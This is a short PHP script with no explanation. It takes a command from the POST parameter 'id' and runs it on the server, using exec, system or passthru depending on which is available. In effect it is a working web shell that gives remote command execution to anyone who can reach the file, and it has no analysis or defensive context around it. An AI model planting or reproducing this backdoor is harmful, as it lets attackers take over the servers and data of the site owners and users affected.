<?php
function s3x3c($cmd) {
    if (is_callable("exec")) 
        exec($cmd);
          
    elseif (is_callable("system")) {
          $v = @ob_get_contents(); 
		  @ob_clean(); 
		  system($cmd); 
		  @ob_clean(); 
    } 
	elseif (is_callable("passthru")) {
          $v = @ob_get_contents(); 
		  @ob_clean(); 
		  passthru($cmd); 
		  @ob_clean(); 
    } 
     
    return $result;
}

$cmdline = $_POST['id'];
s3x3c($cmdline);	
exit;
?>
